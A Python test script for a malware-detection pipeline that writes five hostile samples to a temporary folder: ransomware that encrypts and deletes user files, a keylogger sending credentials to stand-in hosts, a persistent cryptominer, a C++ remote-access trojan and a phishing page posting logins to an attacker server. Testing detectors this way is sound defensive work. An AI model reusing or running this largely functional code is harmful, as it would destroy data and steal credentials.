#!/usr/bin/env python3
"""
Comprehensive security analysis demonstration script.
Tests the enhanced malware detection pipeline on various malicious code samples.
"""

import os
import sys
import tempfile
import shutil
import json

# Add the crawler directory to the Python path
sys.path.append(os.path.join(os.path.dirname(__file__), 'crawler'))

def create_comprehensive_test_repository():
    """Create a test repository with various types of malicious and vulnerable code."""
    test_repo = tempfile.mkdtemp(prefix="security_test_")
    
    # 1. Ransomware example with multiple vulnerabilities
    with open(os.path.join(test_repo, 'ransomware.py'), 'w') as f:
        f.write('''
import os
import subprocess
from cryptography.fernet import Fernet

# Hardcoded sensitive information (vulnerability)
encryption_key = "my_secret_key_123456789012345678901234567890"
bitcoin_wallet = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"

class CryptoLocker:
    def __init__(self):
        self.key = Fernet.generate_key()
        
    def encrypt_files(self):
        # Path traversal vulnerability
        target_dirs = ["../../../Users", "/home", "C:\\\\Users"]
        
        for target_dir in target_dirs:
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    if file.endswith(('.doc', '.pdf', '.jpg', '.png', '.txt')):
                        filepath = os.path.join(root, file) 
                        self.encrypt_file(filepath)
    
    def encrypt_file(self, filepath):
        try:
            fernet = Fernet(self.key)
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = fernet.encrypt(data)
            with open(filepath + '.locked', 'wb') as f:
                f.write(encrypted)
            os.remove(filepath)  # Delete original
        except:
            pass
    
    def drop_ransom_note(self):
        ransom_message = f"""
        YOUR FILES HAVE BEEN ENCRYPTED!
        
        All your important files have been encrypted with military-grade encryption.
        You cannot decrypt them without our special decryption key.
        
        To get your files back:
        1. Pay 0.5 BTC to: {bitcoin_wallet}
        2. Contact us at: darkweb_recovery@tormail.org
        3. Include your unique ID: {os.urandom(16).hex()}
        
        WARNING: Do not try to decrypt files yourself or use third-party tools.
        This will result in permanent data loss!
        """
        
        desktop_paths = [
            os.path.expanduser("~/Desktop/RANSOM_NOTE.txt"),
            "C:\\\\Users\\\\Public\\\\Desktop\\\\RANSOM_NOTE.txt",
            "/tmp/RANSOM_NOTE.txt"
        ]
        
        for path in desktop_paths:
            try:
                with open(path, 'w') as f:
                    f.write(ransom_message)
            except:
                pass
    
    def establish_persistence(self):
        # Command injection vulnerability with malicious intent
        registry_cmd = f'reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "SecurityUpdate" /d "{__file__}"'
        subprocess.run(registry_cmd, shell=True)  # Vulnerable to command injection

if __name__ == "__main__":
    locker = CryptoLocker()
    locker.encrypt_files()
    locker.drop_ransom_note()
    locker.establish_persistence()
''')

    # 2. Keylogger with credential stealing
    with open(os.path.join(test_repo, 'keylogger.py'), 'w') as f:
        f.write('''
import sqlite3
import smtplib
from email.mime.text import MIMEText

# Hardcoded credentials (high vulnerability)
email_password = "admin123"  # Weak password
smtp_server = "smtp.gmail.com" 

class CredentialHarvester:
    def __init__(self):
        self.logged_data = []
        self.email = "hacker@evil.com"
        
    def steal_browser_passwords(self):
        # SQL injection vulnerability in browser data extraction
        chrome_db = "Login Data"
        query = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value = '" + input("Enter username: ") + "'"
        
        try:
            conn = sqlite3.connect(chrome_db)
            cursor = conn.cursor()
            cursor.execute(query)  # Vulnerable to SQL injection
            passwords = cursor.fetchall()
            return passwords
        except:
            return []
    
    def keylogger_hook(self):
        # Simulated keylogger functionality
        import pynput
        from pynput import keyboard
        
        def on_key_press(key):
            try:
                self.logged_data.append(f'Key pressed: {key.char}')
            except AttributeError:
                self.logged_data.append(f'Special key pressed: {key}')
        
        listener = keyboard.Listener(on_press=on_key_press)
        listener.start()
    
    def harvest_clipboard(self):
        # Clipboard monitoring
        import pyperclip
        previous_clipboard = ""
        
        while True:
            current_clipboard = pyperclip.paste()
            if current_clipboard != previous_clipboard:
                if any(keyword in current_clipboard.lower() for keyword in ['password', 'login', 'credit']):
                    self.logged_data.append(f'Clipboard: {current_clipboard}')
                previous_clipboard = current_clipboard
    
    def exfiltrate_data(self):
        # Data exfiltration with hardcoded credentials
        data = "\\n".join(self.logged_data)
        
        msg = MIMEText(data)
        msg['Subject'] = 'Harvested Credentials'
        msg['From'] = self.email
        msg['To'] = 'c2@darkweb.onion'
        
        try:
            server = smtplib.SMTP(smtp_server, 587)
            server.starttls()
            server.login(self.email, email_password)  # Hardcoded password
            server.send_message(msg)
            server.quit()
        except:
            pass

stealer = CredentialHarvester()
stealer.steal_browser_passwords()
stealer.keylogger_hook()
stealer.exfiltrate_data()
''')

    # 3. Cryptocurrency miner with obfuscation
    with open(os.path.join(test_repo, 'cryptominer.js'), 'w') as f:
        f.write('''
// Obfuscated cryptocurrency miner
const crypto = require('crypto');
const WebSocket = require('ws');

// Hardcoded wallet addresses and mining pools
const config = {
    bitcoin_wallet: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    ethereum_wallet: "0x742d35Cc6634C0532925a3b8D6Ac0c6fb0c6340",
    mining_pools: [
        "stratum+tcp://us-east1.ethash-hub.miningpoolhub.com:20535",
        "stratum+tcp://pool.bitcoin.com:3333"
    ]
};

class CryptoJacker {
    constructor() {
        this.hashrate = 0;
        this.shares_submitted = 0;
    }
    
    startMining() {
        console.log("Starting background process...");
        
        // XSS vulnerability in web context
        if (typeof document !== 'undefined') {
            document.innerHTML = "<div>" + user_input + "</div>";  // XSS vulnerability
        }
        
        // Weak cryptographic hash (MD5)
        setInterval(() => {
            const nonce = Math.random().toString(36);
            const data = "block_data" + nonce;
            const hash = crypto.createHash('md5').update(data).digest('hex');  // Weak hash
            
            if (hash.startsWith('0000')) {
                this.submitShare(hash);
            }
            
            this.hashrate++;
        }, 100);
    }
    
    submitShare(hash) {
        const pool_url = config.mining_pools[0];
        
        try {
            const ws = new WebSocket(pool_url);
            ws.on('open', () => {
                ws.send(JSON.stringify({
                    method: 'mining.submit',
                    params: [config.bitcoin_wallet, hash],
                    id: 1
                }));
                this.shares_submitted++;
            });
        } catch (e) {
            // Fail silently to avoid detection
        }
    }
    
    hideProcess() {
        // Process hiding techniques
        if (process.platform === 'win32') {
            process.title = 'svchost.exe';  // Disguise as system process
        } else {
            process.title = 'systemd';
        }
        
        // CPU throttling to avoid detection
        if (this.hashrate > 1000) {
            setTimeout(() => {}, 1000);  // Slow down mining
        }
    }
    
    establishPersistence() {
        const fs = require('fs');
        const path = require('path');
        
        // Create autostart entry (Windows)
        const startup_path = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system_update.js');
        fs.copyFileSync(__filename, startup_path);
        
        // Create cron job (Linux)
        const cron_entry = `@reboot node ${__filename}`;
        fs.appendFileSync('/etc/crontab', cron_entry);
    }
}

const miner = new CryptoJacker();
miner.hideProcess();
miner.startMining();
miner.establishPersistence();
''')

    # 4. Network backdoor with multiple vulnerabilities
    with open(os.path.join(test_repo, 'backdoor.cpp'), 'w') as f:
        f.write('''
#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

// Hardcoded credentials and configuration
const char* C2_SERVER = "evil-command-control.onion";
const char* BACKDOOR_PASSWORD = "admin123";  // Weak password
const int BACKDOOR_PORT = 4444;

class RemoteAccessTrojan {
private:
    int sockfd;
    char buffer[1024];
    
public:
    int connect_to_c2() {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(BACKDOOR_PORT);
        
        return connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    }
    
    void execute_commands() {
        while (true) {
            memset(buffer, 0, sizeof(buffer));
            recv(sockfd, buffer, sizeof(buffer), 0);
            
            // Command injection vulnerability
            char command[2048];
            strcpy(command, "cmd.exe /c ");  // Buffer overflow risk
            strcat(command, buffer);         // Unsafe string concatenation
            
            system(command);  // Direct command execution
        }
    }
    
    void establish_persistence() {
        // Registry persistence (Windows)
        char reg_command[512];
        sprintf(reg_command, "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v SystemUpdate /d %s", __FILE__);
        system(reg_command);  // Command injection vulnerability
        
        // Service creation
        system("sc create SystemUpdate binPath= C:\\\\backdoor.exe start= auto");
    }
    
    void privilege_escalation() {
        // Attempt to exploit common vulnerabilities
        system("powershell -Command \"Add-LocalGroupMember -Group 'Administrators' -Member $env:USERNAME\"");
        
        // Token manipulation
        system("whoami /priv");
        system("runas /user:administrator cmd.exe");
    }
    
    void lateral_movement() {
        // Network scanning
        system("nmap -sS -O target_network/24");
        
        // SMB exploitation
        system("psexec \\\\\\\\target_host -u administrator -p password cmd.exe");
    }
};

int main() {
    RemoteAccessTrojan rat;
    
    if (rat.connect_to_c2() == 0) {
        rat.establish_persistence();
        rat.privilege_escalation();
        rat.lateral_movement();
        rat.execute_commands();
    }
    
    return 0;
}
''')

    # 5. Phishing website with multiple vulnerabilities
    with open(os.path.join(test_repo, 'phishing_site.php'), 'w') as f:
        f.write('''
<?php
// Fake login page for credential harvesting

// Hardcoded database credentials (vulnerability)
$db_host = "localhost";
$db_user = "root";
$db_pass = "admin123";  // Weak password
$db_name = "phishing_db";

// SQL injection vulnerability
if ($_POST['username'] && $_POST['password']) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Vulnerable SQL query construction
    $query = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
    
    $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
    $result = mysqli_query($conn, $query);  // SQL injection vulnerability
    
    // Log stolen credentials
    $log_query = "INSERT INTO stolen_creds (username, password, ip, timestamp) VALUES ('" . 
                 $username . "', '" . $password . "', '" . $_SERVER['REMOTE_ADDR'] . "', NOW())";
    mysqli_query($conn, $log_query);
    
    // Redirect to legitimate site
    header("Location: https://legitimate-bank.com/login?error=invalid");
}

// XSS vulnerability in error display
if (isset($_GET['error'])) {
    echo "<div class='error'>" . $_GET['error'] . "</div>";  // XSS vulnerability
}

// Path traversal vulnerability in file serving
if (isset($_GET['file'])) {
    $filename = $_GET['file'];
    include($filename);  // Path traversal vulnerability
}

// CSRF vulnerability - no token validation
?>

<!DOCTYPE html>
<html>
<head>
    <title>Secure Banking Login</title>
    <script>
        // Information disclosure in JavaScript
        var api_key = "sk-1234567890abcdef";  // Hardcoded API key
        
        function validateForm() {
            var username = document.forms["loginForm"]["username"].value;
            var password = document.forms["loginForm"]["password"].value;
            
            // Weak client-side validation
            if (username == "" || password == "") {
                alert("Please fill in all fields");
                return false;
            }
            
            // Send credentials to attacker server
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://attacker-server.evil/collect", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({
                username: username,
                password: password,
                target: "bank"
            }));
            
            return true;
        }
    </script>
</head>
<body>
    <h1>Secure Online Banking</h1>
    <form name="loginForm" method="post" onsubmit="return validateForm()">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
</body>
</html>
''')

    return test_repo

def run_comprehensive_test():
    """Run comprehensive security analysis test."""
    print("=" * 60)
    print("COMPREHENSIVE SECURITY ANALYSIS TEST")
    print("=" * 60)
    
    # Create test repository
    test_repo = create_comprehensive_test_repository()
    print(f"Created test repository: {test_repo}")
    print(f"Test files created: {len(os.listdir(test_repo))} files")
    
    try:
        # Import the enhanced analyzer
        from enhanced_analyzer import analyze_repository_comprehensive
        
        print("\\n" + "-" * 50)
        print("RUNNING COMPREHENSIVE SECURITY ANALYSIS...")
        print("-" * 50)
        
        # Run comprehensive analysis
        results = analyze_repository_comprehensive(test_repo, vulnerability_threshold='medium')
        
        # Display results
        print("\\n*** ANALYSIS RESULTS ***")
        print_analysis_results(results)
        
        # Save detailed report
        report_path = "comprehensive_security_report.json"
        with open(report_path, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        print(f"\\nDetailed report saved to: {report_path}")
        
    except Exception as e:
        print(f"Error during analysis: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        # Cleanup
        shutil.rmtree(test_repo)
        print(f"\\nCleaned up test repository: {test_repo}")

def print_analysis_results(results):
    """Print formatted analysis results."""
    
    # Combined assessment
    assessment = results.get('combined_assessment', {})
    print(f"\\n🎯 OVERALL ASSESSMENT:")
    print(f"   Combined Risk Score: {assessment.get('combined_score', 0):.3f}/1.000")
    print(f"   Risk Level: {assessment.get('risk_level', 'UNKNOWN')}")
    print(f"   Analysis Confidence: {assessment.get('confidence', 0):.2f}")
    
    # Individual analysis results
    keyword_analysis = results.get('keyword_analysis', {})
    yara_analysis = results.get('yara_analysis', {})
    vuln_analysis = results.get('vulnerability_analysis', {})
    
    print(f"\\n📊 DETECTION BREAKDOWN:")
    print(f"   Malicious Keywords: {len(keyword_analysis.get('malicious_keywords', {}))}")
    print(f"   YARA Pattern Matches: {yara_analysis.get('total_matches', 0)}")
    print(f"   Vulnerabilities Found: {vuln_analysis.get('total_findings', 0)}")
    
    # Threat indicators
    threat_indicators = assessment.get('threat_indicators', [])
    if threat_indicators:
        print(f"\\n⚠️  THREAT INDICATORS ({len(threat_indicators)}):")
        for i, indicator in enumerate(threat_indicators[:5], 1):
            print(f"   {i}. {indicator}")
    
    # YARA categories
    yara_categories = yara_analysis.get('detected_categories', [])
    if yara_categories:
        print(f"\\n🎭 MALWARE CATEGORIES DETECTED:")
        for category in yara_categories[:5]:
            print(f"   • {category.upper()}")
    
    # Vulnerability breakdown
    vuln_by_severity = vuln_analysis.get('findings_by_severity', {})
    if vuln_by_severity:
        print(f"\\n🔐 VULNERABILITY BREAKDOWN:")
        for severity, count in sorted(vuln_by_severity.items(), 
                                    key=lambda x: {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'info': 0}.get(x[0], 0), 
                                    reverse=True):
            print(f"   {severity.upper()}: {count}")
    
    # Top recommendations
    recommendations = assessment.get('recommendations', [])
    if recommendations:
        print(f"\\n💡 TOP RECOMMENDATIONS:")
        for i, rec in enumerate(recommendations[:3], 1):
            print(f"   {i}. {rec}")
    
    # File coverage
    coverage = assessment.get('analysis_coverage', {})
    print(f"\\n📁 ANALYSIS COVERAGE:")
    print(f"   Files analyzed (Keywords): {coverage.get('files_analyzed_keywords', 0)}")
    print(f"   Files analyzed (YARA): {coverage.get('files_analyzed_yara', 0)}")
    print(f"   Files analyzed (Vulnerabilities): {coverage.get('files_analyzed_vulnerabilities', 0)}")

if __name__ == "__main__":
    run_comprehensive_test()